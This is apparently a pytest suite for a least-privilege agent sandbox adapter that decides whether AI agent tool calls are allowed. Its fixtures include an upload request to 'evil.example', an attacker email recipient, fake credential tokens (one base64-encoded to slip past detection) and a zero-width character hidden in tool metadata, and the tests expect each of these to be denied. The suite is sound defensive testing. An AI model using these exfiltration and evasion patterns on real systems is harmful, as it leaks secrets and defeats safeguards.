from __future__ import annotations

import base64
from pathlib import Path

from least_privilege_agent_sandbox.azt_adapter import LeapZTDefense
from least_privilege_agent_sandbox.policy import Policy
from tests.conftest import SPIFFE


def test_azt_adapter_blocks_bad_svid_and_exfil(policy: Policy, workdir: Path) -> None:
    defense = LeapZTDefense(policy)
    workspace = workdir / "workspace"
    ok = defense.decide(
        {
            "trace_id": "t1",
            "step": 0,
            "agent": {"spiffe_id": SPIFFE, "svid": "valid", "attestation": "valid"},
            "tool": "file.read",
            "args": {"path": str(workspace / "ok.txt")},
            "context": {},
            "history": [],
        }
    )
    assert ok["decision"] == "allow"
    bad = defense.decide(
        {
            "agent": {"spiffe_id": SPIFFE, "svid": "expired", "attestation": "valid"},
            "tool": "file.read",
            "args": {"path": str(workspace / "ok.txt")},
        }
    )
    assert bad["decision"] == "deny"
    exfil = defense.decide(
        {
            "agent": {"spiffe_id": SPIFFE, "svid": "valid", "attestation": "valid"},
            "tool": "http.get",
            "args": {"url": "https://evil.example/upload"},
        }
    )
    assert exfil["decision"] == "deny"


def test_azt_adapter_denies_paths_args_exec_and_bad_subject(policy: Policy, workdir: Path) -> None:
    defense = LeapZTDefense(policy)
    workspace = workdir / "workspace"
    base = {
        "agent": {"spiffe_id": SPIFFE, "svid": "valid", "attestation": "valid"},
        "tool": "file.read",
    }
    assert defense.decide({**base, "args": "bad"})["component"] == "args"
    assert (
        defense.decide({**base, "args": {"path": str(workdir / "outside.txt")}})["decision"]
        == "deny"
    )
    assert (
        defense.decide({**base, "tool": "exec", "args": {"cmd": str(workdir / "bad.exe")}})[
            "component"
        ]
        == "policy.exec"
    )
    assert (
        defense.decide({**base, "args": {"cmd": "x" * 3000}, "tool": "exec"})["component"]
        == "policy.args"
    )
    assert (
        defense.decide(
            {
                **base,
                "args": {"output": str(workspace / "out.txt")},
                "tool": "file.read",
            }
        )["decision"]
        == "allow"
    )
    missing = defense.decide(
        {"agent": {"spiffe_id": "spiffe://ztap.test/agent/missing"}, "tool": "file.read"}
    )
    assert missing["decision"] == "deny"


def test_azt_adapter_treats_fs_write_path_as_write_access(workdir: Path) -> None:
    workspace = workdir / "workspace"
    workspace.mkdir(exist_ok=True)
    policy = Policy.from_dict(
        {
            "subjects": {
                SPIFFE: {
                    "allowed_tools": ["file.write"],
                    "fs": {"read": [], "write": [str(workspace)]},
                }
            }
        }
    )
    defense = LeapZTDefense(policy, {"tools": {"file.write": {"scopes": ["fs:write"]}}})
    result = defense.decide(
        {
            "agent": {
                "spiffe_id": SPIFFE,
                "svid": "valid",
                "attestation": "valid",
                "scopes": ["fs:write"],
            },
            "tool": "file.write",
            "args": {"path": str(workspace / "out.txt"), "content": "ok"},
        }
    )
    assert result["decision"] == "allow"


def test_azt_adapter_denies_secret_material_in_arguments(policy: Policy) -> None:
    defense = LeapZTDefense(policy)
    result = defense.decide(
        {
            "agent": {"spiffe_id": SPIFFE, "svid": "valid", "attestation": "valid"},
            "tool": "file.read",
            "args": {"body": "temporary key ghp_0123456789abcdef0123456789abcdef0123"},
        }
    )
    assert result["component"] == "dlp"


def test_azt_adapter_denies_encoded_issued_secret(workdir: Path) -> None:
    policy = Policy.from_dict(
        {
            "subjects": {
                SPIFFE: {
                    "allowed_tools": ["http.post"],
                    "fs": {"read": [str(workdir)], "write": [str(workdir)]},
                    "network": ["example.com:443"],
                    "max_arg_bytes": 4096,
                }
            }
        }
    )
    defense = LeapZTDefense(policy)
    issued_value = "AKIA" + "ABCDEFGHIJKLMNOP"
    defense.on_trace_start({"issued_secrets": [issued_value]})
    encoded = base64.b64encode(issued_value.encode()).decode()
    result = defense.decide(
        {
            "agent": {"spiffe_id": SPIFFE, "svid": "valid", "attestation": "valid"},
            "tool": "http.post",
            "args": {"body": encoded, "url": "https://example.com/collect"},
            "context": {"origin": "user"},
        }
    )
    assert result["component"] == "dlp"


def test_azt_adapter_denies_hidden_unicode_in_tool_metadata(policy: Policy, workdir: Path) -> None:
    defense = LeapZTDefense(policy)
    workspace = workdir / "workspace"
    result = defense.decide(
        {
            "agent": {"spiffe_id": SPIFFE, "svid": "valid", "attestation": "valid"},
            "tool": "file.read",
            "args": {"path": str(workspace / "ok.txt")},
            "context": {
                "origin": "external_catalog",
                "tool_description": "documented helper\u200bwith hidden formatting",
            },
        }
    )
    assert result["component"] == "context"


def test_azt_adapter_denies_malformed_agent(policy: Policy) -> None:
    result = LeapZTDefense(policy).decide({"agent": "bad", "tool": "file.read", "args": {}})
    assert result["decision"] == "deny"


def test_azt_adapter_checks_argv_executable_lists(policy: Policy, workdir: Path) -> None:
    result = LeapZTDefense(policy).decide(
        {
            "agent": {"spiffe_id": SPIFFE, "svid": "valid", "attestation": "valid"},
            "tool": "exec",
            "args": {"argv": [str(workdir / "bad.exe"), "--version"]},
        }
    )
    assert result["component"] == "policy.exec"


def test_azt_adapter_checks_email_recipient_domains(policy: Policy) -> None:
    result = LeapZTDefense(policy, {"email_allowed_domains": ["example.com"]}).decide(
        {
            "agent": {"spiffe_id": SPIFFE, "svid": "valid", "attestation": "valid"},
            "tool": "file.read",
            "args": {"to": ["ops@example.com", "attacker@evil.invalid"]},
        }
    )
    assert result["component"] == "profile.email"


def test_azt_adapter_setup_uses_profile_tool_scopes(policy: Policy, workdir: Path) -> None:
    defense = LeapZTDefense(policy)
    defense.setup({"tools": {"exec": {"scopes": ["shell:exec"]}}})
    denied = defense.decide(
        {
            "agent": {"spiffe_id": SPIFFE, "svid": "valid", "attestation": "valid", "scopes": []},
            "tool": "exec",
            "args": {"argv": [str(workdir / "bad.exe")]},
        }
    )
    assert denied["component"] == "profile.scope"


def test_azt_adapter_denies_tool_absent_from_profile(policy: Policy) -> None:
    result = LeapZTDefense(policy, {"tools": {"http.get": {"scopes": []}}}).decide(
        {
            "agent": {"spiffe_id": SPIFFE, "svid": "valid", "attestation": "valid"},
            "tool": "file.read",
            "args": {},
        }
    )
    assert result["component"] == "profile.tool"


def test_azt_adapter_rejects_malformed_raw_tool_frame(policy: Policy) -> None:
    result = LeapZTDefense(policy).decide(
        {
            "agent": {"spiffe_id": SPIFFE, "svid": "valid", "attestation": "valid"},
            "tool": "file.read",
            "args": {},
            "context": {"raw_generation": '{"tool": "file.read", "args": '},
        }
    )
    assert result["component"] == "context"


def test_azt_adapter_accepts_well_formed_raw_tool_frame(policy: Policy, workdir: Path) -> None:
    workspace = workdir / "workspace"
    result = LeapZTDefense(policy).decide(
        {
            "agent": {"spiffe_id": SPIFFE, "svid": "valid", "attestation": "valid"},
            "tool": "file.read",
            "args": {"path": str(workspace / "ok.txt")},
            "context": {"raw_generation": '{"tool": "file.read", "args": {}}'},
        }
    )
    assert result["decision"] == "allow"


def test_azt_adapter_profile_host_suffix_allows_then_policy_checks(policy: Policy) -> None:
    result = LeapZTDefense(policy, {"egress_allowlist": ["example.com"]}).decide(
        {
            "agent": {"spiffe_id": SPIFFE, "svid": "valid", "attestation": "valid"},
            "tool": "http.get",
            "args": {"url": "https://api.example.com/resource"},
        }
    )
    assert result["component"] == "policy.net"
